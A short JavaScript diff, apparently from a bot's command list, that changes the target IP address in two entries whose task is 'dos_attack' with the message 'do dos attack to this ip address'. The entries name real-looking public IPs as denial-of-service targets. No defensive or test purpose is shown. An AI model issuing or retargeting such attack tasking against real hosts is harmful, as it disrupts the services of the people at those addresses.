@@ -41,7 +41,7 @@ const messages = [
   },
   {
     task: 'dos_attack',
-    params: ['47.254.253.28', '10', '10'],
+    params: ['1.9.255.106', '10', '10'],
     message: 'do dos attack to this ip address'
   },
   {
@@ -51,7 +51,7 @@ const messages = [
   },
   {
     task: 'dos_attack',
-    params: ['47.254.253.28', '10', '10'],
+    params: ['1.9.255.106', '10', '10'],
     message: 'do dos attack to this ip address'
   }
 ];
